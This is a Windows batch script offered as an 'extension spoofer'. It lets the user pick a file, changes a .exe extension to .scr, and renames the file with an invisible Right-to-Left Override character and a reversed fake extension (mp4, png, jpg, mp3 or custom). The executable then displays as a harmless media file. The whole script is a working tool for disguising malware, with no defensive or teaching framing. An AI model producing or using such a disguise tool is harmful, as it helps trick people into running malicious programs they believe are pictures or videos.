@echo off
title extention spoofer
echo this is a extention spoofer
echo press enter to continue
pause >nul
:filepicker
echo please pick a file:
set dialog="about:<input type=file id=FILE><script>FILE.click();new ActiveXObject
set dialog=%dialog%('Scripting.FileSystemObject').GetStandardStream(1).WriteLine(FILE.value);
set dialog=%dialog%close();resizeTo(0,0);</script>"
for /f "tokens=* delims=" %%p in ('mshta.exe %dialog%') do set "file=%%p"
For %%B in ("%file%") do (set file1=%%~nB)
For %%A in ("%file1%") do (SET var2=%file1:~-3%)
For %%C in ("%file%") do (set file2=%%~xC)
:yes
echo this is affecting %file%
echo is this the right file?
echo 1 for yes 
set /P telle=2 for no:
set result1=false
set result=true
if %telle%==1 (set result1=true)
if %telle%==2 (set result1=true & goto :filepicker)
if %result1%==false (goto :wrong)
cls
Setlocal EnableDelayedExpansion
Set "s=#%file1%"
Set "len=0"
For %%N in (4096 2048 1024 512 256 128 64 32 16 8 4 2 1) do (
  if "!s:~%%N,1!" neq "" (
    set /a "len+=%%N"
    set "s=!s:~%%N!"
  )
)
if %file2%==.exe (set file2=.scr)
set /a "len-=3" 
chcp 65001 >nul
if "%~2" neq "" (set %~2=%len%)
set hello=set test^=%%file1:~0,
set blank=‮
:picker
set result=false
echo type 1 for mp4
echo type 2 for png
echo type 3 for jpg
echo type 4 for mp3
echo type 5 for custom
set /p tester=what option do you choose?:
if %tester%==1 (set result=true & set ent=mp4)
if %tester%==2 (set result=true & set ent=png)
if %tester%==3 (set result=true & set ent=jpg)
if %tester%==4 (set result=true & set ent=mp3)
if %tester%==5 (set result=true & set /P ent=pick a custom extention:)
if %result%==false (goto :wrong)
set mum=0
:LOOP
call set tmpa=%%ent:~%mum%,1%%%
set /a mum+=1
if not "%tmpa%" equ "" (
set renstien=%tmpa%%renstien%
goto LOOP
)
set done=%hello%%len%%%%var2%%blank%%renstien%%file2%
call %done%
rename "%file%" "%test%"
pause
:wrong
echo that is not a valid option
if %result%==false (goto :picker)
if %result1%==false (goto :yes)
